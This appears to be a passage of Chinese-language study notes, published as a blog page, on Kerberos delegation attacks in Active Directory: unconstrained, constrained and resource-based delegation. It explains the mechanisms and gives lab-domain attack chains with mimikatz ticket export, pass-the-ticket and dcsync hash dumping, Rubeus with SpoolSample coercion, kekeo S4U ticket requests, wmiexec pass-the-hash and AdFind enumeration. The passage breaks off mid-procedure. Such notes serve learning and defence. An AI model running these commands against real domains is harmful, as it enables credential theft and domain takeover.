+<a class="header-anchor" href="#%e9%9d%9e%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be%e6%94%bb%e5%87%bb"></a>
+非约束委派攻击
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">非约束委派的原理简述：</span>
+</span></span><span class="line"><span class="cl">	<span class="err">它的逻辑非常简单粗暴：只要用户同意，被配置了非约束委派的服务账号，就可以拿用户的“万能门票”（</span><span class="n">TGT</span><span class="err">）去访问域内任意其他服务。</span>
+</span></span><span class="line"><span class="cl">	<span class="err">非约束委派的本质是“客户端无条件的凭证转交”。</span>
+</span></span><span class="line"><span class="cl">    <span class="err">当一台机器或账户被配置了非约束委派后，它就拥有了一个特权：向客户端“索要”</span><span class="n">TGT的资格</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">        <span class="err">标志下发：当用户请求访问这台委派机器时，</span><span class="n">KDC</span> <span class="err">会在发放的服务票据（</span><span class="n">ST</span><span class="err">）中设置一个</span> <span class="n">OK</span><span class="o">-</span><span class="n">AS</span><span class="o">-</span><span class="n">DELEGATE标志位</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">        <span class="err">主动奉上：用户的客户端（如工作站</span><span class="p">)</span> <span class="err">收到这个标志位后，会在后续向目标服务发起认证请求时，自动将用户当前的</span> <span class="n">TGT</span> <span class="err">一并封装在</span> <span class="n">AP</span><span class="o">-</span><span class="n">REQ</span> <span class="err">数据包中发送过去。</span>
+</span></span><span class="line"><span class="cl">        <span class="err">内存缓存：目标服务接收到请求后，会将用户的</span> <span class="n">TGT</span> <span class="err">解密并缓存到本地的内存（</span><span class="n">Lsass</span><span class="err">）中。</span>
+</span></span><span class="line"><span class="cl">        <span class="err">滥用提权：由于拥有了用户的</span> <span class="n">TGT</span><span class="err">，该服务便可以直接代表这名用户，以内置的</span> <span class="n">S4U2Proxy</span> <span class="err">扩展协议向域控申请访问域内任意服务的票据，造成越权横向移动。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">利用场景：</span>
+</span></span><span class="line"><span class="cl">	<span class="err">攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的</span><span class="n">TGT</span><span class="err">，从而模拟域管用户。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">复现配置：</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">1</span><span class="err">、信任此计算机来委派任何服务</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">2</span><span class="err">、</span><span class="n">setspn</span> <span class="o">-</span><span class="n">U</span> <span class="o">-</span><span class="n">A</span> <span class="n">priv</span><span class="o">/</span><span class="n">test</span> <span class="p">[</span><span class="err">服务账户名</span><span class="p">]</span>    <span class="err">为服务账户名设置</span><span class="n">SPN</span><span class="err">，只有设置</span><span class="n">SPN后才可以设置委派</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">判断查询哪些账户上设置非约束委派（查机器账户和服务账号）：</span>
+</span></span><span class="line"><span class="cl">    <span class="err">查询域内设置了非约束委派的</span><span class="o">*</span><span class="err">服务账户</span><span class="o">*</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl">    <span class="n">AdFind</span> <span class="o">-</span><span class="n">b</span> <span class="s2">&#34;DC=god,DC=org&#34;</span> <span class="o">-</span><span class="n">f</span> <span class="s2">&#34;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> <span class="n">dn</span>
+</span></span><span class="line"><span class="cl">    <span class="err">查询域内设置了非约束委派的</span><span class="o">*</span><span class="err">机器账户</span><span class="o">*</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">AdFind</span> <span class="o">-</span><span class="n">b</span> <span class="s2">&#34;DC=god,DC=org&#34;</span> <span class="o">-</span><span class="n">f</span> <span class="s2">&#34;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> <span class="n">dn</span>
+</span></span><span class="line"><span class="cl"><span class="o">--------------------------------------------------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="err">利用思路</span><span class="mi">1</span><span class="err">：诱使域管理员访问机器（这种攻击手段和从上面的“从机器历史缓存提取</span><span class="n">TGT票据</span><span class="err">”几乎一样）</span>
+</span></span><span class="line"><span class="cl">    <span class="err">利用条件：</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">1</span><span class="err">、需要拿到委派机器的本地</span><span class="n">Administrator权限</span><span class="err">（只有这个权限可以看到所有票据缓存）</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">2</span><span class="err">、域内主机的机器账户或服务账户开启非约束委派</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">3</span><span class="err">、域控管理员远程访问委派机器的委派服务，这样域控管理员的</span><span class="n">TGT票据会进行缓存</span><span class="err">（主动或被动）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">利用过程：</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="err">、域控与委派机器通讯</span>
+</span></span><span class="line"><span class="cl">        <span class="err">主动：</span><span class="n">net</span> <span class="n">use</span> \\<span class="n">webserver</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">2</span><span class="err">、导出票据到本地（本地管理员权限）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="o">/</span><span class="k">export</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">3</span><span class="err">、导入票据到内存</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mimikatz</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="n">fece8</span><span class="p">]</span><span class="o">-</span><span class="mi">2</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">60</span><span class="n">a00000</span><span class="o">-</span><span class="n">Administrator</span><span class="err">@</span><span class="n">krbtgt</span><span class="o">-</span><span class="n">GOD</span><span class="o">.</span><span class="n">ORG</span><span class="o">.</span><span class="n">kirbi</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">4</span><span class="err">、连接通讯域控</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shell</span> <span class="n">dir</span> \\<span class="n">owa2010cn</span><span class="o">-</span><span class="n">god</span>\<span class="n">c</span><span class="o">$</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="err">利用思路</span><span class="mi">2</span><span class="err">：结合打印机漏洞</span>
+</span></span><span class="line"><span class="cl">    <span class="err">利用条件：</span><span class="n">DC</span> <span class="mi">2012</span><span class="err">以上</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="err">、</span><span class="n">Administrator权限监听</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">2</span><span class="err">、打印机服务</span><span class="n">spooler开启</span><span class="err">（默认开启）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">利用过程：</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="err">、监听来自</span><span class="n">DC的请求数据并保存文件</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shell</span> <span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="o">/</span><span class="n">interval</span><span class="p">:</span><span class="mi">2</span> <span class="o">/</span><span class="n">filteruser</span><span class="p">:</span><span class="n">dc</span><span class="o">$</span> <span class="o">&gt;</span><span class="nb">hash</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">        <span class="err">域用户运行</span><span class="n">SpoolSample强制让DC请求</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shell</span> <span class="n">SpoolSample</span><span class="o">.</span><span class="n">exe</span> <span class="n">dc</span> <span class="n">web2016</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">2</span><span class="err">、</span><span class="n">Rubeus监听到票据并导入该票据</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shell</span> <span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="o">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">xxx</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">3</span><span class="err">、使用</span><span class="n">mimikatz导出域内Hash</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">xiaodi8</span><span class="o">.</span><span class="n">com</span> <span class="o">/</span><span class="n">all</span> <span class="o">/</span><span class="n">csv</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">4</span><span class="err">、使用</span><span class="n">wmi借助hash横向移动</span>
+</span></span><span class="line"><span class="cl">        <span class="n">python</span> <span class="n">wmiexec</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">0</span><span class="n">b17b318cd59bb4e90f5a528437481a9</span> <span class="n">xiaodi8</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">administrator</span><span class="err">@</span><span class="n">dc</span><span class="o">.</span><span class="n">xiaodi8</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="err">利用思路</span><span class="mi">3</span><span class="err">：结合</span><span class="n">PetitPotam</span>
+</span></span><span class="line"><span class="cl">    <span class="err">适用于</span><span class="n">windows其他版本</span>
+</span></span><span class="line"><span class="cl">    <span class="err">结合</span><span class="n">NTLM</span> <span class="n">Relay监听</span><span class="err">，后续讲到</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">-----------------------------------------------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="err">给机器账户和服务账户配置委派有什么区别</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span> <span class="err">核心区别：权限级别与“波及范围”</span>
+</span></span><span class="line"><span class="cl"><span class="err">🖥️</span> <span class="err">场景一：配置在机器账户上（</span><span class="n">Computer</span> <span class="ne">Object</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">权限级别：系统级（</span><span class="n">SYSTEM</span> <span class="o">/</span> <span class="n">Local</span> <span class="n">System</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">机器账户代表的是整台服务器。一旦在这台机器的</span> <span class="n">AD</span> <span class="err">属性上勾选了“信任此计算机，委派任何服务”，这台电脑上运行的几乎所有系统级服务（如</span> <span class="n">IIS</span><span class="err">、</span><span class="n">SQL</span> <span class="n">Express</span> <span class="err">默认实例、打印机后台处理程序等）都会继承这个“抓票”能力。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">波及范围：全网（只要流量经过此机）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">因为机器账户是非约束的，任何以系统身份（</span><span class="n">Network</span> <span class="n">Service</span> <span class="err">等）运行的服务，在接收用户请求时，都会在本地内存中留下用户的</span> <span class="n">TGT</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">👤</span> <span class="err">场景二：配置在服务账号上（</span><span class="n">Service</span> <span class="n">Account</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">权限级别：应用级（特定域用户身份）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">服务账号本质上就是一个普通的域用户（只是不能交互式登录）。只有在你手动将某个应用程序（如</span> <span class="n">SQL</span> <span class="n">Server</span><span class="err">、自定义的</span> <span class="n">Web</span> <span class="err">后端）配置为专门使用这个服务账号运行时，它才会生效。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">波及范围：仅限于该应用</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">只有通过这个特定服务入口进来的用户，其</span> <span class="n">TGT</span> <span class="err">才会被该服务账号缓存。机器上跑的其他无关服务完全不受影响。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="mf">2.</span> <span class="err">实战攻防：黑客视角的“性价比”与“隐秘度”</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">假设你是一个内网渗透黑客，眼前有两台机器：</span><span class="n">A机</span><span class="err">（配置了机器账户非约束委派）、</span><span class="n">B机</span><span class="err">（配置了某个服务账号的非约束委派）。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">🎯</span> <span class="err">攻击</span> <span class="n">A</span> <span class="err">机（机器账户）：核弹级大丰收</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">诱捕成本低：你只需要诱导一个域管（</span><span class="n">DA</span><span class="err">）访问</span> <span class="n">A</span> <span class="err">机上的任意一个默认共享（比如通过打印机漏洞</span> <span class="n">MS</span><span class="o">-</span><span class="n">RPRN强制回连</span><span class="err">，或者社会工程学骗域管看一个</span> <span class="n">SMB</span> <span class="err">共享路径）。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">收获巨大：只要域管的凭证一过来，</span><span class="n">A</span> <span class="err">机的内存里就会留下域管的</span> <span class="n">TGT</span><span class="err">。你拿出</span> <span class="n">Mimikatz</span><span class="err">，一键提取</span> <span class="n">TGT</span><span class="err">，直接拿着这张票去域控（</span><span class="n">DC</span><span class="err">）“刷脸”，整个域瞬间沦陷。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">🎣</span> <span class="err">攻击</span> <span class="n">B</span> <span class="err">机（服务账号）：精准钓鱼，步步惊心</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">诱捕门槛高：你必须精确知道是哪个业务系统在用这个服务账号。你不能随便发个</span> <span class="n">SMB</span> <span class="err">请求就去骗</span> <span class="n">TGT</span><span class="err">，因为默认的</span> <span class="n">SMB</span> <span class="err">服务是以机器账户运行的。你需要构造特定的请求，去访问那个特定的业务端口（比如</span> <span class="n">HTTP</span> <span class="err">或特定</span> <span class="n">SQL</span> <span class="err">端口）。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">局限性大：就算你拿到了</span> <span class="n">TGT</span><span class="err">，这个服务账号往往权限很低，你可能还得面临二次提权。</span>
+</span></span></code></pre></div><h3 id="约束委派攻击-有点复杂还没有捋顺">
+<a class="header-anchor" href="#%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be%e6%94%bb%e5%87%bb-%e6%9c%89%e7%82%b9%e5%a4%8d%e6%9d%82%e8%bf%98%e6%b2%a1%e6%9c%89%e6%8d%8b%e9%a1%ba"></a>
+约束委派攻击 (有点复杂，还没有捋顺)
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">原理：
+</span></span><span class="line"><span class="cl">由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了SService for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">注意点：
+</span></span><span class="line"><span class="cl">	设置约束委培配置时，需要先选择主机 再选择 服务。这说明，只能对指定机器上的指定服务进行委派。相比于非约束委派，攻击面非常小。而且如果约束委派指定的服务不重要，甚至没有攻击价值。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">利用场景：
+</span></span><span class="line"><span class="cl">如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。则攻击者可以先使用S4u2seflt申请域管用户（administrator）访问A服务的ST1，然后使用S4u2Proxy以administrator身份访问域控的CIFS服务，即相当于控制了域控。
+</span></span><span class="line"><span class="cl">攻击链：
+</span></span><span class="line"><span class="cl">	阶段一：前期交互与情报收集（踩点与准备）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        确立立足点：攻击者首先需要在内网中拿下了一台机器，并提取到了某个服务账户（如笔记中的 webadmin）的明文密码或 NTLM Hash。
+</span></span><span class="line"><span class="cl">        侦察委派关系：攻击者使用该服务账户的权限，查询域内的 LDAP 信息，寻找配置了约束委派的目标。一旦发现 webadmin被允许委派到域控（DC）的 CIFS（文件共享）服务，便锁定了攻击目标。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	阶段二：Kerberos 票据伪造（S4U 协议滥用）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        这是攻击链的核心，完全绕过了用户的原始密码验证：
+</span></span><span class="line"><span class="cl">        获取自身 TGT：利用 webadmin的密码/Hash，通过 Kerberos AS 协议向域控请求并拿到 webadmin自身的 TGT（票据授予票据）。
+</span></span><span class="line"><span class="cl">        S4U2Self（冒充请求）：拿着 webadmin的 TGT，使用 S4U2Self 协议向域控“撒谎”：“我是管理员（Administrator），请给我一张访问我自己的票据”。域控校验 TGT 合法，便返回一张不可转发的 ST（服务票据）。
+</span></span><span class="line"><span class="cl">        S4U2Proxy（跨服务委派）：拿着上一步获取的 ST，通过 S4U2Proxy 协议向域控请求：“我有管理员的权限，现在请以管理员的名义给我一张访问域控 CIFS 服务的票据”。由于 webadmin配置了约束委派，域控放行并返回了以域管身份访问域控 CIFS 的 ST。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	阶段三：横向移动与权限收割（Pass-the-Ticket）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        注入票据：攻击者将拿到的“域管访问域控CIFS”的 ST 通过 Mimikatz 等工具注入到当前会话的内存中（Pass-the-Ticket 攻击）。
+</span></span><span class="line"><span class="cl">        越权操作：此时，攻击者无需知道域管密码，即可通过 SMB 协议以域管权限列出域控的 C 盘目录（dir \\dc\c$），随后可通过 PsExec 等手段在域控上上线木马，彻底拿下整个域。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">复现配置：
+</span></span><span class="line"><span class="cl">1、机器设置仅信任此计算机指定服务-cifs
+</span></span><span class="line"><span class="cl">2、用户设置仅信任此计算机指定服务-cifs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">利用思路：使用机器账户票据
+</span></span><span class="line"><span class="cl">利用条件：kekeo Rubeus getST 
+</span></span><span class="line"><span class="cl">1、需要Administrator权限
+</span></span><span class="line"><span class="cl">2、目标机器账户配置了约束性委派
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">判断查询：
+</span></span><span class="line"><span class="cl">查询机器用户（主机）配置约束委派
+</span></span><span class="line"><span class="cl">AdFind -b &#34;DC=god,DC=org&#34; -f &#34;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&#34; msds-allowedtodelegateto
+</span></span><span class="line"><span class="cl">查询服务账户（主机）配置约束委派
+</span></span><span class="line"><span class="cl">AdFind -b &#34;DC=god,DC=org&#34; -f &#34;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&#34; msds-allowedtodelegateto
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kekeo利用步骤：
+</span></span><span class="line"><span class="cl">1、获取webadmin用户的票据
+</span></span><span class="line"><span class="cl">kekeo &#34;tgt::ask /user:webadmin /domain:god.org /password:admin!@#45 /ticket:administrator.kirbi&#34; &#34;exit&#34;
+</span></span><span class="line"><span class="cl">kekeo &#34;tgt::ask /user:webadmin /domain:god.org /NTLM:518b98ad4178a53695dc997aa02d455c /ticket:administrator.kirbi&#34; &#34;exit&#34;
+</span></span><span class="line"><span class="cl">2、利用webadmin用户票据请求获取域控票据
+</span></span><span class="line"><span class="cl">kekeo &#34;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org&#34; &#34;exit&#34;
+</span></span><span class="line"><span class="cl">3、导入票据到内存
+</span></span><span class="line"><span class="cl">mimikatz kerberos::ptt TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi
+</span></span><span class="line"><span class="cl">4、连接通讯域控
+</span></span><span class="line"><span class="cl">shell dir \\owa2010cn-god.god.org\c$
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">约束委派的情况下，在服务账户上配置和在机器账户上配置的区别
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">和非约束的情况不同。
+</span></span><span class="line"><span class="cl">在约束性委派情况中，在服务账户设置委派  和 在机器账户上设置委派 在攻击角度上看没有区别，因为约束委派本身就指定了服务，在这两种账户上设置委派不会对触发门槛造成影响
+</span></span></code></pre></div><h3 id="关于约束和非约束委派的思考">
+<a class="header-anchor" href="#%e5%85%b3%e4%ba%8e%e7%ba%a6%e6%9d%9f%e5%92%8c%e9%9d%9e%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be%e7%9a%84%e6%80%9d%e8%80%83"></a>
+关于约束和非约束委派的思考
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">我注意到，非约束委派情况下，会在委派机器上直接缓存TGT；而在约束委派的情况下，则需要账户自己去申请票据。原因如下：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1. 非约束委派：野蛮生长的“全权委托”
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">底层逻辑：信任至上，自带凭证。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">历史原因：​ 早期设计为了最大化的兼容性，微软觉得“既然你都敢把这台服务器设为委派了，那我就当你是完全可信的”。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">运行机制：​ 当有高权限用户（比如域管）访问这台非约束委派机器时，不仅要证明自己是域管，还要把自己的 TGT（黄金票据）​ 一并交给这台机器缓存起来。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">结果：​ 这台机器拿到了域管的 TGT，就等于拿到了域管的“万能钥匙”。它想去访问内网哪台机器（比如域控），就直接用这把钥匙去 KDC 申请对应服务的票据。整个过程，KDC 是不介入“委派转发”这个动作的，它只负责常规的售票。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2. 约束委派：合规管控的“专项审批”
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">底层逻辑：权限收紧，按需申请。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">历史原因：​ 随着网络安全发展，非约束委派的风险暴露无遗。微软在 Win 2003 R2 引入了 S4U 协议，目的就是把“申请票据”的主动权收回到 KDC 手里，防止服务乱用用户凭证。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">运行机制：​ 服务账户（如 webadmin）根本没有用户的 TGT。它如果想代替用户去访问另一个服务，必须拿着自己的 TGT​ 作为担保，去向 KDC 发起 S4U2Proxy​ 请求。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">结果：​ KDC 会严格审查 AD 里的策略（“嘿，服务 A 真的被允许访问服务 B 吗？”）。只有审查通过，KDC 才会专门为它签发一张只能访问特定服务 B​ 的 ST（服务票据）。没有 KDC 的审批，服务账户寸步难行。
+</span></span></code></pre></div><h3 id="资源约束委派攻击">
+<a class="header-anchor" href="#%e8%b5%84%e6%ba%90%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be%e6%94%bb%e5%87%bb"></a>
+资源约束委派攻击
+</h3><p>一、 为什么会有“基于资源的约束委派”？（痛点的催生）</p>
+<p>在 RBCD 诞生之前，域内只有两种委派方式：<strong>非约束委派</strong>和<strong>约束委派</strong>。但它们都有极其致命的痛点：</p>
+<ol>
+<li></li>
+</ol>
+<p><strong>非约束委派（危险分子）：</strong> “你要帮我取个快递？行，把你家大门钥匙给我吧！”</p>
+<ul>
+<li></li>
+</ul>
+<pre><code> **痛点：** 只要用户同意，服务就能拿到用户的“万能钥匙（TGT）”。一旦这台服务被黑，用户的所有权限都泄露了。**风险极高，域管基本不敢轻易开启。**
+</code></pre>
+<ol start="2">
+<li></li>
+</ol>
+<p><strong>传统约束委派（高冷官僚）：</strong> “你要帮我取个快递？行，但你只能去菜鸟驿站，而且必须经过我（域控）盖章批准。”</p>
+<ul>
+<li></li>
+</ul>
+<pre><code> **痛点：** 虽然安全（限制了只能访问特定服务），但**配置权限太高了！** 想要配置传统约束委派，你必须拥有域管理员的权限（因为要修改服务账户的 `msDS-AllowedToDelegateTo`属性）。
+</code></pre>
+<ul>
+<li></li>
+</ul>
+<pre><code> **现实窘境：** 想象一下，公司有个几百个微服务的前端 Web 服务器，每次新增一个数据库连接，前端小弟都要跪求域管大哥帮忙在域控上改配置。**运维效率极低，域管成了业务瓶颈。**
+</code></pre>
+<p>为了打破这种“要么不安全，要么太麻烦”的僵局，微软在 <strong>Windows Server 2012 R2</strong> 中引入了 <strong>基于资源的约束委派（RBCD）</strong>。</p>
+<p>二、 RBCD 是什么？（一句话道破本质）</p>
+<p><strong>RBCD 的本质，就是把“谁能访问我”的决定权，从域控（全局管理员）手里，下放给了“资源本身的管理员”。</strong></p>
+<ul>
+<li></li>
+</ul>
+<p><strong>传统约束委派是“前端决定去哪”：</strong> 我在我的服务 A 上打个勾，允许我去访问服务 B。（需要域管权限配置前端）</p>
+<ul>
+<li></li>
+</ul>
+<p><strong>RBCD 是“后端决定谁能动我”：</strong> 我在我的服务 B 上设个白名单，只允许服务 A 代表用户来访问我。（只需服务 B 的管理员权限）</p>
+<p>在底层属性上，它不再修改前端的 <code>msDS-AllowedToDelegateTo</code>，而是修改了<strong>后端目标计算机/服务</strong>的一个新属性：<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>。</p>
+<p>三、 RBCD 在实际配置中的特点。</p>
+<ul>
+<li>在约束委派中，需要选择指定<strong>机器</strong>和<strong>可委派服务</strong>。但RBCD中，仅可在<strong>资源服务器</strong>设置信任的账户SID，无需明细具体可委派的服务。</li>
+<li>在非约束委派和约束委派时，配置在机器账户和服务账户都可以。但在RBCD中，只能在机器账户上配置，否则不会生效。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">利用前必须知道事项：
+</span></span><span class="line"><span class="cl">	1.域里有一个著名的组策略限制：普通域用户默认最多只能在域中创建 10 个机器账户（ms-DS-MachineAccountQuota默认为 10）
+</span></span><span class="line"><span class="cl">	2.在域里，普通域用户是没有权限随便去修改别人家机器的属性的。那什么时候你才能修改呢？在 Windows 域的默认机制里，谁把一台机器加进域，谁就是这台机器的“Creator Owner”（创建者所有者）。这个“创建者”对这台机器拥有隐式的“完全控制（GenericAll）”权限！
+</span></span><span class="line"><span class="cl">所以，笔记里查“同一个账户加入”的真正目的是：一句话总结这层逻辑：找同一创建者，是为了找到一个可以对目标机器下手（修改属性）的权限跳板。
+</span></span><span class="line"><span class="cl">	3. Acount Operators组成员可修改域内任意主机的msDS-AllowedToActOnBehalfOfOtherIdentity属性。(除DC) 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">攻击的本质：利用共同创建者特权 或者 组权限，将目标机器委派参数修改为自行构造的机器账户SID，伪造任意用户的ST票据。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">利用思路：
+</span></span><span class="line"><span class="cl">	发现域内有两台或以上计算机是共同的创建者 或者 Acount Operators组成员的账户是被自己可控的，然后创建可利用机器账户，利用共同创建者的特点，将目标机器的msDS-AllowedToActOnBehalfOfOtherIdentity参数修改为自建机器账户的SID，最后通过自建机器账户委派任意账户的票据（包括域管理员）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">攻击的前提：
+</span></span><span class="line"><span class="cl">	1、允许创建机器账户（默认情况下普通域内账户均有权限创建，上限为10个）
+</span></span><span class="line"><span class="cl">	2、两台或以上计算机是共同的创建者  或者   当前利用的账户在Acount Operators组中
+</span></span><span class="line"><span class="cl">攻击的目标：
+</span></span><span class="line"><span class="cl">	1、若满足  “两台或以上计算机是共同的创建者 ” 这个条件，攻击的目标共是 同通创建者的其他机器。
+</span></span><span class="line"><span class="cl">	2、若满足 “当前利用的账户在Acount Operators组中” 这个条件，攻击目标是 域内除AD的所有机器。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">利用过程：
+</span></span><span class="line"><span class="cl">1、判断是否有利用条件：
+</span></span><span class="line"><span class="cl">查询被域用户创建的机器账户列表:（关键在这一步，看看内网机器有没有是同一个SID，有就表示它们有共同创建者）
+</span></span><span class="line"><span class="cl">shell AdFind.exe -b &#34;DC=xiaodi,DC=local&#34; -f &#34;(&amp;(samAccountType=805306369))&#34; cn mS-DS-CreatorSID
